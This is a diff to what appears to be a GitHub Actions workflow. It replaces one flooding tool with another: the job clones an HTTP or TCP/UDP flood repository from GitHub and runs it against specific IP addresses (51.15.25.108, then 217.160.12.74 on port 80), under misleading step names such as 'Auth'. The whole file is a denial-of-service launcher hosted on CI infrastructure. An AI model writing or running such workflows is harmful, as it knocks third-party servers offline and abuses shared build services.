@@ -9,8 +9,8 @@ jobs:
 
     steps:
     - name: Download
-      run: git clone https://github.com/FloppaAirlines394/golang-httpflood.git
+      run: git clone https://github.com/Leeon123/TCP-UDP-Flood.git
     - name: Extract
-      run: sudo apt install golang
+      run: sudo apt install python3-pip
     - name: Auth
-      run: go run golang-httpflood/httpflood.go http://51.15.25.108/ 100 get 600 nil
+      run: python TCP-UDP-Flood/flood.py -i 217.160.12.74 -p 80
